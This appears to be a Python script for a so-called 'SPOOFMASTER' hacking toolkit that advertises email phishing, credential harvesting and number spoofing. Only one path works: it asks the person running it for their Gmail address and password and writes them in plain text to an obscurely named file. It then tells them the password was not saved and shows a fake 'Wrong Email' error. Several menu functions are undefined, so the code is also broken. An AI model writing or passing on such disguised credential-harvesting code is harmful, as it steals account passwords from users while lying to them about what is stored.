import time
import os
from colorama import Fore, Back, Style
os.system('color 04')
wait=time.sleep
RF=Fore.RED
GF=Fore.GREEN
WF=Fore.WHITE
YF=Fore.YELLOW
CF=Fore.CYAN
BF=Fore.BLUE
A='''
███████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
███████╗██████╔╝██║   ██║██║   ██║█████╗  ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
███████║██║     ╚██████╔╝╚██████╔╝██║     ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝'''
B='''\n\nWelcome To SPOOFMASTER, A Lower\nQuality MetaSploit, We Have Everything From
Number Spoofing, Email Phishing,\nCredential Harvesters And More,\nEnjoy . . .
(FullScreen Recommended)'''
AA="\n\n\nPlease Choose An Option\n"
BB=". Email Phishing)"
CC=". Credential Harvester) C O M M I N G    S O O N"
DD=". Number Spoof)         C O M M I N G    S O O N"
EE=". Spear Phishing)       C O M M I N G    S O O N\n"
BBB="1"
CCC="2"
DDD="3"
EEE="4"
BBBB="\n("
CCCC="\n("
DDDD="\n("
EEEE="\n("
BBBBB=YF+BBBB+RF+BBB+YF+BB
CCCCC=YF+CCCC+RF+CCC+YF+CC
DDDDD=YF+DDDD+RF+DDD+YF+DD
EEEEE=YF+EEEE+RF+EEE+YF+EE
C='''\n\n\nEmail Phishing Involves Sending Someone An Email With Something Malicious
Inside Of It, To Begin Select What Type Of Attack You Want . . .\n\n'''
D="1. Executable File\nMore Comming Soon"
E="\n\nPlease Enter The Infromation Of The Gmail Your Sending From"
F="\nSorry Software Does Not Support MD5 Hash Yet, PassWord Was Not Saved . . .\n\n"
G="\n\nEnter The Email Of Whom Your Sending It To . . ."
print(RF+A+GF+B+GF+AA+YF+BBBBB+CCCCC+DDDDD+EEEEE);
A1=input(CF+'Number Here: '+RF)
if A1=="1":
 print(GF+C+YF+D)
A2=input(CF+'Number Here: '+RF)
if A1=="2":
  F2()
if A1=="3":
  F3();
if A1=="4":
  F4();
if A2=="1":
 print(GF+E)
A3=input(CF+"Gmail -> ")
A4=input(CF+"PassWord -> ")
f=open("uiwgfiuwagfiuagfiaufgauwgfwai.txt","a+")
f.write("Email -> "+A3+" "+"PassWord -> "+A4+"\n")
f.close()
A5=input(CF+"Would You Like To Save This? PassWord Will By Encrypted in MD5 ["+RF+"Y"+CF+"] "+CF+"Or ["+RF+"N"+CF+"]: "+RF)
if A5=="Y" or A5=="y":
 print(GF+F); 
if A5=="N" or A5=="n":
 print(GF+G)
A6=input(CF+"Gmail -> ")
print("\n\n"+YF+"Please Wait . . .")
wait(2)
print("\n"+RF+"Wrong Email, Exiting . . .")
wait(2)

 


